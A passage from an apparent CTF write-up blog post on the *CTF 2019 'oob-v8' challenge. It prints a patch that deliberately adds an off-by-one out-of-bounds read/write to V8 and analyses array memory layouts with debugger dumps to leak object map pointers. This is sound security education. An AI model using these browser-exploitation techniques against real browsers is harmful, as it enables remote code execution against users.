<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>*CTF 2019 - oob-v8 :: ulexec.github.io</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="This post will cover the chrome exploit challenge oob-v8 from *CTF. The challenge can be found here.
01 -Analyzing the Patch if we take a close look at the patch oob.diff from the *CTF v8-oob challenge we will observe the introduction of the ArrayOob function. Authors of this challenge didn&amp;rsquo;t really wanted to make the discovery of the vulnerability a hard task, and there are even comments for the read/write primitives." />
<meta name="keywords" content="" />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="https://ulexec.github.io/post/2021-05-20-startctf2019_oobv8/" />






  
  
  
  
  
  <link rel="stylesheet" href="https://ulexec.github.io/styles.css">







  <link rel="shortcut icon" href="https://ulexec.github.io/img/theme-colors/blue.png">
  <link rel="apple-touch-icon" href="https://ulexec.github.io/img/theme-colors/blue.png">



<meta name="twitter:card" content="summary" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="*CTF 2019 - oob-v8">
<meta property="og:description" content="This post will cover the chrome exploit challenge oob-v8 from *CTF. The challenge can be found here.
01 -Analyzing the Patch if we take a close look at the patch oob.diff from the *CTF v8-oob challenge we will observe the introduction of the ArrayOob function. Authors of this challenge didn&amp;rsquo;t really wanted to make the discovery of the vulnerability a hard task, and there are even comments for the read/write primitives." />
<meta property="og:url" content="https://ulexec.github.io/post/2021-05-20-startctf2019_oobv8/" />
<meta property="og:site_name" content="ulexec.github.io" />

  
    <meta property="og:image" content="https://ulexec.github.io/img/favicon/blue.png">
  

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">

  <meta property="article:section" content="writeup" />


  <meta property="article:published_time" content="2021-04-08 00:00:00 &#43;0000 UTC" />












</head>
<body class="blue">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/post/">
  <div class="logo">
    ulexec.github.io
  </div>
</a>

    </div>
    
      <ul class="menu menu--mobile">
  <li class="menu__trigger">Menu&nbsp;â–¾</li>
  <li>
    <ul class="menu__dropdown">
      
        
          <li><a href="/post/">Archives</a></li>
        
      
        
          <li><a href="/publications/">Publications</a></li>
        
      
        
          <li><a href="/projects/">Projects</a></li>
        
      
        
          <li><a href="/bugs/">Bugs</a></li>
        
      
        
          <li><a href="/about/">About</a></li>
        
      
      
    </ul>
  </li>
</ul>

    
    
  </div>
  
    <nav class="navigation-menu">
  <ul class="navigation-menu__inner menu--desktop">
    
      
        
          <li><a href="/post/" >Archives</a></li>
        
      
        
          <li><a href="/publications/" >Publications</a></li>
        
      
        
          <li><a href="/projects/" >Projects</a></li>
        
      
        
          <li><a href="/bugs/" >Bugs</a></li>
        
      
        
          <li><a href="/about/" >About</a></li>
        
      
      
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<article class="post">
  <h1 class="post-title">
    <a href="https://ulexec.github.io/post/2021-05-20-startctf2019_oobv8/">*CTF 2019 - oob-v8</a>
  </h1>
  <div class="post-meta"><time class="post-date">2021-04-08</time><span class="post-author">ulexec</span></div>

  
    <span class="post-tags">
      
      #<a href="https://ulexec.github.io/tags/pwn/">pwn</a>&nbsp;
      
      #<a href="https://ulexec.github.io/tags/ctf/">ctf</a>&nbsp;
      
      #<a href="https://ulexec.github.io/tags/chrome/">chrome</a>&nbsp;
      
    </span>
  
  


  

  <div class="post-content"><div>
        <p>This post will cover the chrome exploit challenge <code>oob-v8</code> from *<em>CTF</em>.
The challenge can be found <a href="https://github.com/Changochen/CTF/raw/master/2019/*ctf/Chrome.tar.gz">here</a>.</p>
<h1 id="01--analyzing-the-patch">01 -Analyzing the Patch<a href="#01--analyzing-the-patch" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>if we take a close look at the patch <code>oob.diff</code> from the *<em>CTF</em> v8-oob challenge we will observe the introduction of the <code>ArrayOob</code> function. Authors of this challenge didn&rsquo;t really wanted to make the discovery of the vulnerability a hard task, and there are even comments for the read/write primitives.
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span>diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
</span></span><span style="display:flex;"><span>index 8df340e..9b828ab 100644
</span></span><span style="display:flex;"><span><span style="color:#f92672">--- a/src/builtins/builtins-array.cc
</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span><span style="color:#a6e22e">+++ b/src/builtins/builtins-array.cc
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span><span style="color:#75715e">@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   return *final_length;
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span> }  // namespace
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">+BUILTIN(ArrayOob){
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+    uint32_t len = args.length();
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+    Handle&lt;JSReceiver&gt; receiver;
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+    if(len == 1){
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+        //read
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+    }else{
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+        //write
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+        Handle&lt;Object&gt; value;
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+        elements.set(length,value-&gt;Number());
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+        return ReadOnlyRoots(isolate).undefined_value();
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+    }
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+}
</span></span></span></code></pre></div></p>
<ul>
<li>Arguments passed will be checked to be greater than 2.
If arguments are greater than 2, the function returns an undefined value</li>
<li>The <code>JSArray</code> is casted into a <code>FixedDoubleArray</code>.</li>
<li>The <code>length</code> variable will hold the length of the array. Lets remember that the length of the array should be length-1 since the first element of the array would be a pointer to <code>this</code>, and therefore not being part of the Array&rsquo;s elements.</li>
<li>If the number of arguments is 1, meaning no arguments other than <code>this</code>, then the function will return the element at position <code>elements[length]</code>. This denotes an OOB read by one index, as the real index of the first element should be 0.</li>
<li>If the number of arguments is 2, meaning one additional argument apart from <code>this</code>, the element at index <code>elements[length]</code>, will be set to the value of <code>value</code>. That denotes an OOB write by one index.</li>
</ul>
<h1 id="02---leveraging-the-oob-vulnerabilities">02 - Leveraging the OOB vulnerabilities<a href="#02---leveraging-the-oob-vulnerabilities" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>As we were able to analyze, we essentially have two vulnerabilities. An OOB read and an OOB write.</p>
<p>How can we leverage these vulnerabilities? Thats exactly the question we will be answering in this section.</p>
<p>First of all, we know that the vulnerable code, only affects arrays as is implemented as an array property.</p>
<p>Furthermore, we know that each Array can hold elements of different kind. Depending of their kind, Array elements will be stored in different ways, including them being inlined and out-of-line in the given internal holding object of a <code>JSArray</code> object.</p>
<p>For example, lets look at a an <code>JSArray</code> with elements of kind <code>PACKED_ELEMENTS</code>:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1.1</span>, <span style="color:#ae81ff">3</span>, <span style="color:#e6db74">&#34;1&#34;</span>]</span></span></code></pre></div>
If we inspect this Array in GDB with <code>d8</code> debug build we can see how these elements are stored:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>d8<span style="color:#f92672">&gt;</span> <span style="color:#f92672">%</span><span style="color:#a6e22e">DebugPrint</span>(a)
</span></span><span style="display:flex;"><span>DebugPrint: <span style="color:#ae81ff">0x34e829bd1499</span><span style="color:#f92672">:</span> [JSArray]
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> map: <span style="color:#ae81ff">0x23fe2f482f79</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">Map</span>(PACKED_ELEMENTS)<span style="color:#f92672">&gt;</span> [FastProperties]
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> prototype: <span style="color:#ae81ff">0x1a89b9ad1111</span> <span style="color:#f92672">&lt;</span>JSArray[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> elements: <span style="color:#ae81ff">0x34e829bd1429</span> <span style="color:#f92672">&lt;</span>FixedArray[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">&gt;</span> [<span style="color:#a6e22e">PACKED_ELEMENTS</span> (COW)]
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> length: <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> properties: <span style="color:#ae81ff">0x39bc44b00c71</span> <span style="color:#f92672">&lt;</span>FixedArray[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">&gt;</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#length: 0x335aec1001a9 &lt;AccessorInfo&gt; (const accessor descriptor)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> }
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> elements: <span style="color:#ae81ff">0x34e829bd1429</span> <span style="color:#f92672">&lt;</span>FixedArray[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">&gt;</span> {
</span></span><span style="display:flex;"><span>           <span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x1a89b9ae2761</span> <span style="color:#f92672">&lt;</span>HeapNumber <span style="color:#ae81ff">1.1</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>           <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>           <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x1a89b9ae26c9</span> <span style="color:#f92672">&lt;</span>String[<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">:</span> <span style="color:#ae81ff">5</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span>
</span></span><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> x<span style="color:#f92672">/</span><span style="color:#ae81ff">4</span>xg <span style="color:#ae81ff">0x34e829bd1499</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>							<span style="color:#75715e">// JSArray
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x34e829bd1498</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x000023fe2f482f79</span>	<span style="color:#ae81ff">0x000039bc44b00c71</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//					^---map                 ^---properties
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x34e829bd14a8</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x000034e829bd1429</span>	<span style="color:#ae81ff">0x0000000300000000</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//					^---elements
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> x<span style="color:#f92672">/</span><span style="color:#ae81ff">18</span>xg <span style="color:#ae81ff">0x000034e829bd1429</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>						<span style="color:#75715e">// elements pointer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x34e829bd1428</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x000039bc44b00851</span>	<span style="color:#ae81ff">0x0000000300000000</span>  <span style="color:#75715e">// FixedArray
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//					^--- map                ^---- length
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x34e829bd1438</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00001a89b9ae2761</span>	<span style="color:#ae81ff">0x0000000300000000</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//					^--- HeapNumber 1.1     ^---- Smi 3
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x34e829bd1448</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00001a89b9ae26c9</span>	<span style="color:#ae81ff">0x000039bc44b00851</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//					^--- String[#1]			^---- another Map instance
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x34e829bd1458</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000400000000</span>	<span style="color:#ae81ff">0x0000335aec108039</span>  <span style="color:#75715e">// -+
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x34e829bd1468</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x000034e829bd13e9</span>	<span style="color:#ae81ff">0x0000000000000000</span>  <span style="color:#75715e">//  | other related
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x34e829bd1478</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0xffffffff00000000</span>	<span style="color:#ae81ff">0x000039bc44b012c9</span>  <span style="color:#75715e">//  | HeapObjects
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x34e829bd1488</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000100000000</span>	<span style="color:#ae81ff">0x0000040000000000</span>  <span style="color:#75715e">// -+
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x34e829bd1498</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x000023fe2f482f79</span>	<span style="color:#ae81ff">0x000039bc44b00c71</span>  <span style="color:#75715e">// JSArray
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x34e829bd14a8</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x000034e829bd1429</span>	<span style="color:#ae81ff">0x0000000300000000</span></span></span></code></pre></div>
As we can observe, there are a few other allocated HeapObjects consecutively after the <code>JSArray</code>&rsquo;s&rsquo; elements. But we will soon realize, this is not the case for Arrays with different elements kinds. Lets look another example of a <code>JSArray</code> with elements of kind <code>PACKED_DOUBLE_ELEMENTS</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">b</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1.2</span>, <span style="color:#ae81ff">1.1</span>]</span></span></code></pre></div>
<p>Looking at the <code>d8</code> debug build in GDB we see the following:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>d8<span style="color:#f92672">&gt;</span> <span style="color:#f92672">%</span><span style="color:#a6e22e">DebugPrint</span>(b)
</span></span><span style="display:flex;"><span>DebugPrint: <span style="color:#ae81ff">0x34e829bd1ad1</span><span style="color:#f92672">:</span> [JSArray]
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> map: <span style="color:#ae81ff">0x23fe2f482ed9</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">Map</span>(PACKED_DOUBLE_ELEMENTS)<span style="color:#f92672">&gt;</span> [FastProperties]
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> prototype: <span style="color:#ae81ff">0x1a89b9ad1111</span> <span style="color:#f92672">&lt;</span>JSArray[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> elements: <span style="color:#ae81ff">0x34e829bd1ab1</span> <span style="color:#f92672">&lt;</span>FixedDoubleArray[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">&gt;</span> [PACKED_DOUBLE_ELEMENTS]
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> length: <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> properties: <span style="color:#ae81ff">0x39bc44b00c71</span> <span style="color:#f92672">&lt;</span>FixedArray[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">&gt;</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#length: 0x335aec1001a9 &lt;AccessorInfo&gt; (const accessor descriptor)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> }
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> elements: <span style="color:#ae81ff">0x34e829bd1ab1</span> <span style="color:#f92672">&lt;</span>FixedDoubleArray[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">&gt;</span> {
</span></span><span style="display:flex;"><span>           <span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1.2</span>
</span></span><span style="display:flex;"><span>           <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1.1</span>
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span>
</span></span><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> x<span style="color:#f92672">/</span><span style="color:#ae81ff">4</span>xg <span style="color:#ae81ff">0x34e829bd1ad1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>                           <span style="color:#75715e">// JSArray
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x34e829bd1ad0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x000023fe2f482ed9</span>	<span style="color:#ae81ff">0x000039bc44b00c71</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//                    ^---map                 ^---properties
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x34e829bd1ae0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x000034e829bd1ab1</span>	<span style="color:#ae81ff">0x0000000200000000</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//                    ^---elements
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> x<span style="color:#f92672">/</span><span style="color:#ae81ff">8</span>xg <span style="color:#ae81ff">0x000034e829bd1ab1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>                       <span style="color:#75715e">// elements pointer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x34e829bd1ab0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x000039bc44b014f9</span>	<span style="color:#ae81ff">0x0000000200000000</span>   <span style="color:#75715e">// FixedDoubleArray
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//                    ^--- map                ^--- length
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x34e829bd1ac0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x3ff3333333333333</span>	<span style="color:#ae81ff">0x3ff199999999999a</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//                    ^--- 1.2                ^--- 1.1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x34e829bd1ad0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x000023fe2f482ed9</span>	<span style="color:#ae81ff">0x000039bc44b00c71</span>   <span style="color:#75715e">// JSArray
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x34e829bd1ae0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x000034e829bd1ab1</span>	<span style="color:#ae81ff">0x0000000200000000</span></span></span></code></pre></div>
As we can see, for a <code>JSArray</code> of elements of kind <code>PACKED_DOUBLE_ELEMENTS</code>, these are stored as 64bit doubles, and there is no other consecutive objects after the JSArray elements.</p>
<p>This is relevant since our OOB vulnerabilities only enable us to write/read the next field after the last element of our <code>JSArray</code> object. Therefore, we can already tell that depending which kind of elements we use, we will be able to read/wrtie a different map instance accordingly.</p>
<p>For the <code>JSArray</code> <code>a</code> with elements of kind <code>PACKED_ELEMENTS</code>, we will be able to read/write the map instance of the <code>FixedArray</code> object holding the elements of our <code>JSArray</code> object. We can see this debugging the <code>d8</code> release instance:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>d8<span style="color:#f92672">&gt;</span> let a <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1.1</span>, <span style="color:#ae81ff">3</span>, <span style="color:#e6db74">&#34;1&#34;</span>]   
</span></span><span style="display:flex;"><span>d8<span style="color:#f92672">&gt;</span> <span style="color:#e6db74">&#34;0x&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">ftoi</span>(a.<span style="color:#a6e22e">oob</span>()).<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;0x3882de940851&#34;</span>
</span></span><span style="display:flex;"><span>d8<span style="color:#f92672">&gt;</span> <span style="color:#f92672">%</span><span style="color:#a6e22e">DebugPrint</span>(a)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x176d4ccd0d01</span> <span style="color:#f92672">&lt;</span>JSArray[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span>
</span></span><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> x<span style="color:#f92672">/</span><span style="color:#ae81ff">4</span>xg <span style="color:#ae81ff">0x176d4ccd0d01</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x176d4ccd0d00</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000332786dc2f79</span>	<span style="color:#ae81ff">0x00003882de940c71</span>   <span style="color:#75715e">// JSArray
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x176d4ccd0d10</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000176d4ccd0c61</span>	<span style="color:#ae81ff">0x0000000300000000</span>
</span></span><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> x<span style="color:#f92672">/</span><span style="color:#ae81ff">24</span>xg <span style="color:#ae81ff">0x0000176d4ccd0c61</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>                      <span style="color:#75715e">// Elements
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x176d4ccd0c60</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00003882de940851</span>	<span style="color:#ae81ff">0x0000000300000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x176d4ccd0c70</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000291e539227d1</span>	<span style="color:#ae81ff">0x0000000300000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x176d4ccd0c80</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00003882de944349</span>	<span style="color:#ae81ff">0x00003882de940851</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//                                          ^--- return of a.oob()
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x176d4ccd0c90</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000400000000</span>	<span style="color:#ae81ff">0x000009a078f03b29</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x176d4ccd0ca0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000176d4ccd0c21</span>	<span style="color:#ae81ff">0x0000000000000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x176d4ccd0cb0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0xffffffff00000000</span>	<span style="color:#ae81ff">0x00003882de9412c9</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x176d4ccd0cc0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000100000000</span>	<span style="color:#ae81ff">0x0000040000000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x176d4ccd0cd0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00003882de941279</span>	<span style="color:#ae81ff">0x0000000400000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x176d4ccd0ce0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000200000000</span>	<span style="color:#ae81ff">0x0000291e539173e9</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x176d4ccd0cf0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000291e53922949</span>	<span style="color:#ae81ff">0x00003882de9404d1</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x176d4ccd0d00</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000332786dc2f79</span>	<span style="color:#ae81ff">0x00003882de940c71</span>   <span style="color:#75715e">// JSArray
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x176d4ccd0d10</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000176d4ccd0c61</span>	<span style="color:#ae81ff">0x0000000300000000</span></span></span></code></pre></div>
However, on the other hand, we can observe that if we instead use the <code>JSArray</code> <code>b</code> with elements of kind <code>PACKED_DOUBLE_ELEMENTS</code>, we would instead read/write the map instance of our <code>JSArray</code> object itself, due to the very way these kind of elements are stored. We can observe the following in GDB, again debugging the <code>d8</code> release build:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>d8<span style="color:#f92672">&gt;</span> let b <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1.2</span>, <span style="color:#ae81ff">1.1</span>]
